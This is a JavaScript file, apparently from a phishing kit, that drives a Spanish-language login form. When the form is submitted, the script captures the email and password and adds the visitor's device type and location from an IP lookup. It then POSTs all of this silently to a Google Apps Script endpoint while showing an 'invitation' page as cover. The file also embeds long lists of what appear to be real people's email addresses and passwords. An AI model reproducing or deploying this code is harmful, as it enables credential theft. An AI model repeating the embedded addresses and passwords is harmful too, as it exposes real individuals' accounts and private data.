document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["siaravaldivia0704@gmail.com","contacto@zmgrouperu.com","hailyhernandez17@gmail.com","cornienaelis@gmail.com","santiagos@gmail.com","jafetperez201314@gmail.com","Prueba.correo1506@gmail.com","eiva.marquez.rotondo@gmail.com","cuzcanodelaguiladaniela@gmail.com","anireip.idorap92@gmail.com","managerrodriguezn@gmail.com","florsita.8929@gmail.com","milagrosmananimendoza@ieemelitoncarvajal.edu.pe","keibervillarroel2002@gmail.com","yuritzarb08@gmail.com","karvielysosa@gmail.com","overflow2005.18@gmail.com","rulitejas2024@gmail.com","jaicogonzales003@gmail.com","miraydayupe@gmail.com","lopezllantoyf@gmail.com","angelinex002@gmail.com","axelfabriciotassovega@gmail.com","mifloresfa@ucvvirtual.edu.pe","tabata.suarez@latam.com","trashinahuafl@gmail.com","marcamaqueraedward11@gmail.com","ny.fernandezcr@unsm.edu.pe","jazminrodriguez15v@gmail.com","alexandracastroperes@gmail.com","rulitejas2024@gmail.com","robertoguzvel@gmail.com","hazzanimport1234@gmail.com","aridiazgu@uch.pe","spykealvarado@hotmail.com","janet311950@gmail.com","janetalvarado311950@gmail.com","norely.sh21@gmail.com","lipatriciagutierrezjimenez@gmail.com","keylaboulanggerdelvalle@gmail.com","nacarickfabiolis@gmail.com","varcentaless03@unia.edu.pe","valentina.reyes@crsh.beleneduca.cl","britanyrengifo14@gmail.com","mayaraisidro0@gmail.com","chaskaproducciones01@gmail.com","alejandrogimenezcolman18@gmail.com","keitysaavedragonzales@gmail.com","mariaradaa26@gmail.com","anhr1713@gmail.com","lleymiluislero@gmail.com","gigarciapa@ucvvirtual.edu.pe","demily.cordova@ucsp.edu.pe","ajrobalinon@crear.ucal.edu.pe","aldeir_netflix_123@hotmail.com","ruth2003.com@hotmail.com","rzumetad61@unia.edu.pe","nicolasyfloppagod@gmail.com","nicolasyfloppagod@gmail.com","nikolfermin07@gmail.com","reyhasmter@gmail.com","jonattanjoelgarcialeo7@gmail.com","yurimarmedina02@gmail.com","villosladarengifot@gmail.com","019100739c@uandina.edu.pe","019100729c@uandina.edu.pe","estefanocernaalaba@gmail.com","guaniloguanilokoke@gmail.com","parcedahua@gmail.com","anaf.felix@upsjb.edu.pe","sophieriverah@gmail.com","dariellasalazar8@gmail.com","jorgealtamirano31@hotmail.com","wonderwallasd1@gmail.com","em.calderontu@alum.up.edu.pe","liateresa993@gmail.com","newan2110@gmail.com","alvillacorta200@gmail.com","mateo_akemi_18@hotmail.com","2320104023@unia.edu.pe","71256596@continental.edu.pe","darkgirlfrank@gmail.com","olenkamaryi2025@gmail.com","minayaanthu@gmail.com","ominayaga@ucvvirtual.edu.pe","elide_gatynha@hotmail.com","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["es2245622","Es2245622","alexa1718","Alexa1718","alexa1718@","Alexa1718@","alexa@1718","Alexa@1718","clarisa2528","Clarisa2528","Alissongr13","alissongr13","Haily17","Greinyer10","Loveteo10","Diosesamor10","djhaily130580","Balbuena2006","Balbuena2006@","Fatima090303.","fatima090303","luciana090303","luciana090303.","fatima090303.","akamaru23","Akamaru23","Adriana11","pauloLivana12yccm","PauloLivana12yccm","Vale.1983","V4l3.1983","dayra123","Dayra123","dayanna_2020","15092005E.L.g.c**","l@ri2005","L@ri2005","kennetnicol","Kennetnicol","Hsksjsvsnask","9893593","61261026","Eithan211","eyssa32459483","Eyssa32459483","Tanbella18","tanbella18","coqueta2006*","barreto1130","Barreto1130","Coqueta2006*","angelita92","Angelita92","angelita15","Angelita15","Brownieymax1902","brownieymax1902","ewy1234567","Ewy1234567","dv7486ct760511","kinnamyprincess<3","Nancy2811","Luissanyelys10","Debby2016","Floresabad27","Nancy2811#","lucian@02","Lucian@02","10002000","nabBnzz","NabBnzz","32942986","Luisafernanda1975","EAcr63063373@","EACR63063373@.","Eilanylayla30","EAcr63063373@","lucyvargas2126","Lucyvargas2126","Alisonmolina","mingyue15","Mingyue15","Camilaaron1993","camilaaron1993","alisonmolina","28052323","sasha23090418","Luciana23090418","Pinky23090418","Adrian23090418@","Jordi23090418@","179311j","kira123456789","Kira123456789","121619isa","12161906","123456789","1234567890","jhknv","Jhknv","Eliansilva2500","tacachoconcecina","TACACHOCONCECINA","Tacachoconcecina","andreaturzi2306","andreaturzi2306","ctdaciamaria1","Ctdaciamaria1","dayannaPizarro0104_Da1","DayannaPizarro0104_Da1","dayannaPizarro0104_2005","DayannaPizarro0104_2005","Anahi123","anahi123","addiscute20","76391931","joseph2810.@","JOSEPH2810","Joseph2810.@","1sofiarivera3","08112019omar","gidtip-5fowfo-derdUs","16485558","Holaaaa","18668799","Allisonsonrisa","allisonsonrisa","maracaibo2023","Maracaibo2023","75701571","alfalfa23","Alfalfa23","bbbbb","BBBBB","AAAAA","momentico2024@","Momentico2024@","Ai1912Ai","fabianatodio","fabianatodio..","80243690eladio","80243690Eladio","80243690","75573800","74808220kc","74808220Kc","lyssa212002","Lyssa212002","74808220Kc","nicolas2024","nicolas2025","Nicolas2024","Nicolas2025","76693962","Alyssrominaxd","alyssrominaxd","Gonzales7125","VAR20var","fran11fppr18","kiraBella1819B","KiraBella1819B","47867269epp","pepas5314","Pepas5314","fran11fppr1819","Fran11fppr1819","22223333","Lilablue19@@","Lilablue19@@","Lilablue19","lilablue19","Mdnsjsla","Aaaaa","jovita70","Jovita70","jovita70*","Jovita70*","17025612","Jovita70**","jovita70**","75573800","Alyssromina21","alyssromina21","adri71318901","Adri71318901","alyssromina21xd","Alyssromina21xd","cielito1309","Cielito1309","Mybabyslat23$","-Mybabyslat23$","050285cr7","lavidaesunamierda2","Cambiocambio2","Cambiocambio3","cambiocambio3","cambiocambio2","lavidaesunamierda2","emilse.1952@","Madrid1917@","Emilse.1952@","929915693bas","929915693Bas","jugodefresa5","Jugodefresa5","jugodefresa","Jugodefresa","Darlyn2006","darlyn2006","18668799","Tifany123.","Soportes.2025","soportes.2025","jenniffer0505","Jenniffer0505","no quiero p","No quiero p","kimbergor22","Kimbergor22","johitaw12","Johitaw12","ange27","Ange27","Yessenia09","yessenia.09","Yessenia.09","cambiocambio3","pepas5314","Pepas5314","kpgz16$%","jovita70**","Jovita70**","17025612","Jovita70*","jovita70*","grissel1234567890#","Grissel1234567890#","lavidaesunamierda2","Cambiocambio2","cambiocambio2","4FS3YZfpZCjwPAR","977846069","dairy.12","jovita70**","Nuevasoportunidades08","nuevasoportunidades08","Olivia1106","Olivia11.06","Olivia2109","olivia1106","olivia11.06","Olivia2019","olivia2019"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "Contraseña incorrecta";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
 // Antes de mostrar el iframe, ocultar el footer de folder.html
document.querySelector("p").style.display = "none"; 

// Mostrar el iframe
let iframe = document.getElementById("usuarioFrame");
iframe.src = "invitation.html";
iframe.style.display = "block";

    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
